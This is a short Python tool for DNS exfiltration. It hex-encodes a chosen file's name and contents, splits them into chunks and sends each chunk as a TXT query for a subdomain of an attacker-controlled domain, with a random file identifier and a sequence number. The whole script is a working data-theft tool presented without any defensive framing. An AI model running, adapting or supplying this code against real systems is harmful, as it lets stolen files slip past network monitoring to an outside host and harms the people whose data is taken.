#!/usr/bin/env python3

import dns.resolver
import binascii
import argparse
import random
import string

parser = argparse.ArgumentParser()
parser.add_argument('--domain','-d',required=True)
parser.add_argument('--file','-f',required=True)
args = parser.parse_args()

def random_string_digits(string_length=4):
	'''generate a random alpha-num string for file identifier''' 
	letters_and_digits = string.ascii_letters + string.digits
	return ''.join(random.choice(letters_and_digits) for i in range(string_length))

def is_ascii(fn):
	try:
		chunk_size = 512
		while 1:
			chunk = fn.read(chunk_size)
			if '\0' in chunk:
				return 1
			if len(chunk) < chunk_size:
				return 1
	except:	
		return 0

def make_query(wf,num):
	characters = 42
	for i in range (0, len(wf), characters):
		xfil_data =  (str(hex(num)[2:]) + "20" + file_id + "20" + wf[i:i+characters])
		tld = ("d.%s.%s"%(xfil_data.rjust(60,'0'),args.domain))
		try:
			dns.resolver.query(tld,'TXT')
		except:
			#print("didn't work for %s"%(tld))
			pass
		num += 1

file_id =  random_string_digits()
num = 1

'''create a header for data transfer with the filename'''
header = args.file.encode().hex()
make_query(header,num)

print("File: %s\nID: %s\n"%(args.file,file_id))

with open (args.file,"r") as work_file:
	'''test if the file is ascii'''
	if is_ascii(work_file) is 1:
		work_file.seek(0)
		enc_txt_file = binascii.hexlify(work_file.read().encode())
		make_query(enc_txt_file.decode(),num)
		work_file.close()
	else:
		work_file.close()
		with open (args.file,'rb') as bin_file:
			enc_bin_file = binascii.hexlify(bin_file.read()).decode()
			make_query(enc_bin_file,num)

exit()
